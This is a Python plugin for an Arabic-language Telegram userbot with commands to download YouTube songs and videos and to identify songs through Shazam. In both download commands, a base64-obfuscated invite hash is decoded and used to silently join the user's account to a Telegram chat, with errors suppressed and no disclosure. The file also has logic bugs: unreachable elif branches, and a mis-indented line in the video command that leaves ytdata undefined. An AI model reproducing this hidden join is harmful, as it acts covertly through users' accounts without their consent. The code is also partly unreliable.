import base64
import io
import os
from pathlib import Path

from ShazamAPI import Shazam
from telethon import types
from telethon.tl.functions.messages import ImportChatInviteRequest as Get
from validators.url import url
from youtubesearchpython import Video

from userbot import jmthon

from ..core.logger import logging
from ..core.managers import edit_delete, edit_or_reply
from ..helpers.functions import name_dl, song_dl, video_dl, yt_search
from ..helpers.tools import media_type
from ..helpers.utils import _catutils, reply_id
from . import hmention

plugin_category = "utils"
LOGS = logging.getLogger(__name__)

# =========================================================== #
#                           STRINGS                           #
# =========================================================== #
SONG_SEARCH_STRING = "⌯︙جاري البحث عن الاغنية إنتظر رجاءًا  🎧"
SONG_NOT_FOUND = "⌯︙لم أستطع إيجاد هذه الأغنية  ⚠️"
SONG_SENDING_STRING = "⌯︙قم بإلغاء حظر البوت  🚫"
SONGBOT_BLOCKED_STRING = (
    "<code>الـرجاء الـغاء حـظر @songdl_bot و الـمحاولة مـرة اخـرى</code>"
)
# =========================================================== #
#                                                             #
# =========================================================== #


@jmthon.ar_cmd(
    pattern="اغنية(320)?(?:\s|$)([\s\S]*)",
    command=("بحث", plugin_category),
    info={
        "header": "To get songs from youtube.",
        "description": "Basically this command searches youtube and send the first video as audio file.",
        "flags": {
            "320": "if you use song320 then you get 320k quality else 128k quality",
        },
        "usage": "{tr}song <song name>",
        "examples": "{tr}song memories song",
    },
)
async def _(event):
    "⌯︙للبحث عن أغاني  🎧"
    reply_to_id = await reply_id(event)
    reply = await event.get_reply_message()
    if event.pattern_match.group(2):
        query = event.pattern_match.group(2)
    elif reply and reply.message:
        query = reply.message
    else:
        return await edit_or_reply(event, "**⌔ ︙ما الذي تريد أن أبحث عنه  **")
    cat = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
    catevent = await edit_or_reply(
        event, "**⌯︙لقـد عـثرت عـلى المطلـوب إنتظر قليلا  **"
    )
    video_link = await yt_search(str(query))
    if not url(video_link):
        return await catevent.edit(
            f"**⌯︙عـذرًا لم استطيع ايجاد المقطع الصوتي  أو الفيديو لـ ** `{query}`"
        )
    cmd = event.pattern_match.group(1)
    q = "320k" if cmd == "320" else "128k"
    song_cmd = song_dl.format(QUALITY=q, video_link=video_link)
    # thumb_cmd = thumb_dl.format(video_link=video_link)
    name_cmd = name_dl.format(video_link=video_link)
    try:
        cat = Get(cat)
        await event.client(cat)
    except BaseException:
        pass
    stderr = (await _catutils.runcmd(song_cmd))[1]
    if stderr:
        return await catevent.edit(f"**⌯︙خـطأ  :** `{stderr}`")
    catname, stderr = (await _catutils.runcmd(name_cmd))[:2]
    if stderr:
        return await catevent.edit(f"**⌯︙خـطأ   :** `{stderr}`")
    # stderr = (await runcmd(thumb_cmd))[1]
    catname = os.path.splitext(catname)[0]
    # if stderr:
    #    return await catevent.edit(f"**خطأ :** `{stderr}`")
    song_file = Path(f"{catname}.mp3")
    if not os.path.exists(song_file):
        return await catevent.edit(
            f"**⌯︙عـذرًا لم أستطع إيجاد الأغنية أو الفيديو لـ  ** `{query}`"
        )
    await catevent.edit("**⌯︙ المطلوب لقد وجدت إنتظر قليلا  ⏱**")
    catthumb = Path(f"{catname}.jpg")
    if not os.path.exists(catthumb):
        catthumb = Path(f"{catname}.webp")
    elif not os.path.exists(catthumb):
        catthumb = None

    ytdata = Video.get(video_link)
    await event.client.send_file(
        event.chat_id,
        song_file,
        force_document=False,
        caption=f"<b><i>➥ الـعنـوان :- {ytdata['title']}</i></b>\n<b><i>➥ الرفـع بـواسـطة :- {hmention}</i></b>",
        parse_mode="html",
        thumb=catthumb,
        supports_streaming=True,
        reply_to=reply_to_id,
    )
    await catevent.delete()
    for files in (catthumb, song_file):
        if files and os.path.exists(files):
            os.remove(files)


async def delete_messages(event, chat, from_message):
    itermsg = event.client.iter_messages(chat, min_id=from_message.id)
    msgs = [from_message.id]
    async for i in itermsg:
        msgs.append(i.id)
    await event.client.delete_messages(chat, msgs)
    await event.client.send_read_acknowledge(chat)


@jmthon.ar_cmd(
    pattern="فيديو(?:\s|$)([\s\S]*)",
    command=("فيديو", plugin_category),
    info={
        "header": "To get video songs from youtube.",
        "description": "Basically this command searches youtube and sends the first video",
        "usage": "{tr}vsong <song name>",
        "examples": "{tr}vsong memories song",
    },
)
async def _(event):
    "⌯︙للبحث عن فيديوات أغاني"
    reply_to_id = await reply_id(event)
    reply = await event.get_reply_message()
    if event.pattern_match.group(1):
        query = event.pattern_match.group(1)
    elif reply and reply.message:
        query = reply.message
    else:
        return await edit_or_reply(event, "**⌯︙يجـب وضـع  الأمر وبجانبه إسم الأغنية  ")
    cat = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
    catevent = await edit_or_reply(event, "**⌯︙لقـد وجدت الفيديو المطلوب إنتظر قليلا  ")
    video_link = await yt_search(str(query))
    if not url(video_link):
        return await catevent.edit(
            f"**⌯︙عـذرًا لم أستطع إيجاد أي فيديو او صوت متعلق بـ ** `{query}`"
        )
    # thumb_cmd = thumb_dl.format(video_link=video_link)
    name_cmd = name_dl.format(video_link=video_link)
    video_cmd = video_dl.format(video_link=video_link)
    stderr = (await _catutils.runcmd(video_cmd))[1]
    if stderr:
        return await catevent.edit(f"**⌯︙خـطأ  :** `{stderr}`")
    catname, stderr = (await _catutils.runcmd(name_cmd))[:2]
    if stderr:
        return await catevent.edit(f"**⌯︙خـطأ  ️ :** `{stderr}`")
    # stderr = (await runcmd(thumb_cmd))[1]
    try:
        cat = Get(cat)
        await event.client(cat)
    except BaseException:
        pass
    # if stderr:
    #    return await catevent.edit(f"**Error :** `{stderr}`")
    catname = os.path.splitext(catname)[0]
    vsong_file = Path(f"{catname}.mp4")
    if not os.path.exists(vsong_file):
        vsong_file = Path(f"{catname}.mkv")
    elif not os.path.exists(vsong_file):
        return await catevent.edit(
            f"**⌯︙عـذرًا لم أستطع إيجاد أي فيديو او صوت متعلق بـ ** `{query}`"
        )
    await catevent.edit("**⌔︙لقد وجدت الفديو المطلوب انتظر قليلا  **")
    catthumb = Path(f"{catname}.jpg")
    if not os.path.exists(catthumb):
        catthumb = Path(f"{catname}.webp")
    elif not os.path.exists(catthumb):
        catthumb = None

        ytdata = Video.get(video_link)
    await event.client.send_file(
        event.chat_id,
        vsong_file,
        force_document=False,
        caption=f"<b><i>➥ الـعنـوان :- {ytdata['title']}</i></b>\n<b><i>➥ الرفـع بـواسـطة :- {hmention}</i></b>",
        parse_mode="html",
        thumb=catthumb,
        supports_streaming=True,
        reply_to=reply_to_id,
    )
    await catevent.delete()
    for files in (catthumb, vsong_file):
        if files and os.path.exists(files):
            os.remove(files)


@jmthon.ar_cmd(
    pattern="نتائج البحث$",
    command=("نتائج البحث", plugin_category),
    info={
        "الاستخدام": "للـبحث عن اغنيه معـينة.",
        "الشرح": "اعادة البحث عن اغنيه بالرد على المقطع الصوتي",
        "الامر": "{tr}معلومات الاغنية <بالرد على رسالة صوتية>",
    },
)
async def shazamcmd(event):
    "للـبحث عن اغنـية."
    reply = await event.get_reply_message()
    mediatype = media_type(reply)
    if not reply or not mediatype or mediatype not in ["Voice", "Audio"]:
        return await edit_delete(
            event, "⌯︙قم بالرد على الرسالة الصوتية لعكس البحث عن هذه الأغنية  "
        )
    catevent = await edit_or_reply(event, "⌔︙جاري تحميل المقطع الصوتي  ")
    try:
        for attr in getattr(reply.document, "attributes", []):
            if isinstance(attr, types.DocumentAttributeFilename):
                name = attr.file_name
        dl = io.FileIO(name, "a")
        await event.client.fast_download_file(
            location=reply.document,
            out=dl,
        )
        dl.close()
        mp3_fileto_recognize = open(name, "rb").read()
        shazam = Shazam(mp3_fileto_recognize)
        recognize_generator = shazam.recognizeSong()
        track = next(recognize_generator)[1]["track"]
    except Exception as e:
        LOGS.error(e)
        return await edit_delete(
            catevent, f"**⌔︙هناك خطأ عند محاولة البحث عن الأغنية   :**\n__{str(e)}__"
        )
    image = track["images"]["background"]
    song = track["share"]["subject"]
    await event.client.send_file(
        event.chat_id, image, caption=f"**⌯︙الأغنية  :** `{song}`", reply_to=reply
    )
    await catevent.delete()
